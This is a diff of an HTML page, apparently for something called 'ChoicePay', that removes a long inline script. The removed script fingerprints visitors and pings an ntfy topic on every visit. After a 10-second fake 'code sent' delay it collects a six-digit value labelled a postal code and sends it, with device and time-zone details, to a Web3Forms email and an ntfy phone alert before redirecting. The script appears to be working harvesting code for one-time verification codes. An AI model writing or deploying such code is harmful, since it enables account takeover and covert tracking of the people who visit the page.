-      else if (/Edg\//.test(ua) || /EdgA\//.test(ua) || /EdgiOS\//.test(ua)) browser = "Edge";
-      else if (/OPR\/|OPT\/|Opera/.test(ua)) browser = "Opera";
-      else if (/SamsungBrowser/.test(ua)) browser = "Samsung Internet";
-      else if (/FxiOS|Firefox/.test(ua)) browser = "Firefox";
-      else if (/CriOS/.test(ua)) browser = "Chrome (iOS)";
-      else if (/Chrome\//.test(ua)) browser = "Chrome";
-      else if (/Safari\//.test(ua)) browser = "Safari";
-
-      return { os: os, device: device, browser: browser, ua: ua };
-    }
-
-    // Best effort: some Android Chrome versions will share the phone model
-    function getModel() {
-      try {
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-          return navigator.userAgentData.getHighEntropyValues(["model"]).then(function (v) {
-            return v.model || "";
-          }).catch(function () { return ""; });
-        }
-      } catch (e) {}
-      return Promise.resolve("");
-    }
-
-    // Form stays greyed out for 10 seconds, then switches on
-    var LOAD_SECONDS = 10;
-    var fields = document.getElementById("fields");
-    var statusBtn = document.getElementById("status");
-
-    setTimeout(function () {
-      fields.disabled = false;
-      form.classList.remove("is-loading");
-      statusBtn.classList.add("done");
-      document.getElementById("spinner").classList.add("hidden");
-      document.getElementById("check").classList.remove("hidden");
-      document.getElementById("status-text").textContent = "code sent";
-    }, LOAD_SECONDS * 1000);
-
-    statusBtn.addEventListener("click", function () {
-      if (statusBtn.classList.contains("done")) input.focus();
-    });
-
-    // Phone notification every time the page is opened or reloaded (via the free ntfy app)
-    var NTFY_TOPIC = "choicepay-82948tro5f7za9";
-
-    function notifyVisit() {
-      var d = detectDevice();
-      var reloaded = false;
-      try {
-        var nav = performance.getEntriesByType("navigation")[0];
-        reloaded = !!nav && nav.type === "reload";
-      } catch (e) {}
-
-      getModel().then(function (model) {
-        var lines = [
-          d.device + " / " + d.os + (model ? " (" + model + ")" : ""),
-          "Browser: " + d.browser,
-          "Screen: " + window.screen.width + " x " + window.screen.height
-        ];
-        return fetch("https://ntfy.sh/", {
-          method: "POST",
-          keepalive: true,
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            topic: NTFY_TOPIC,
-            title: reloaded ? "ChoicePay page reloaded" : "ChoicePay page opened",
-            message: lines.join("\n"),
-            tags: [reloaded ? "arrows_counterclockwise" : "eyes"]
-          })
-        });
-      }).catch(function () { /* never bother the visitor if this fails */ });
-    }
-    notifyVisit();
-
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-      if (!/^[0-9]{6}$/.test(input.value)) {
-        error.textContent = "Please enter exactly 6 digits.";
-        input.focus();
-        return;
-      }
-      button.disabled = true;
-      button.textContent = "Sending...";
-
-      var d = detectDevice();
-      getModel().then(function (model) {
-        var tz = "";
-        try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
-
-        var payload = {
-          access_key: ACCESS_KEY,
-          subject: "New ChoicePay postal code (test)",
-          from_name: "ChoicePay Test Form",
-          postal_code: input.value,
-          device_type: d.device,
-          operating_system: d.os,
-          phone_model: model || "not shared by browser",
-          browser: d.browser,
-          screen_size: window.screen.width + " x " + window.screen.height,
-          language: navigator.language || "",
-          timezone: tz,
-          page: window.location.href,
-          user_agent: d.ua,
-          botcheck: form.elements["botcheck"].checked
-        };
-
-        // 1) Email copy via Web3Forms
-        var toEmail = fetch("https://api.web3forms.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json", "Accept": "application/json" },
-          body: JSON.stringify(payload)
-        }).then(function (res) { return res.json(); })
-          .then(function (data) { return !!data.success; })
-          .catch(function () { return false; });
-
-        // 2) Phone notification via ntfy, with the postal code in it
-        var toPhone = fetch("https://ntfy.sh/", {
-          method: "POST",
-          keepalive: true,
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            topic: NTFY_TOPIC,
-            title: "New postal code: " + input.value,
-            message: [
-              "Postal code: " + input.value,
-              d.device + " / " + d.os + (model ? " (" + model + ")" : ""),
-              "Browser: " + d.browser,
-              "Screen: " + window.screen.width + " x " + window.screen.height,
-              "Time zone: " + tz
-            ].join("\n"),
-            priority: 4,
-            tags: ["incoming_envelope"]
-          })
-        }).then(function (res) { return res.ok; })
-          .catch(function () { return false; });
-
-        return Promise.all([toEmail, toPhone]);
-      })
-        .then(function (results) {
-          // Go on if at least one of the two worked
-          if (!results[0] && !results[1]) throw new Error("failed");
-          window.location.href = REDIRECT_URL;
-        })
-        .catch(function () {
-          button.disabled = false;
-          button.textContent = "Submit";
-          error.textContent = "Could not send. Please try again.";
-        });
-    });
-  </script>
+  <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
 </body>
 </html>
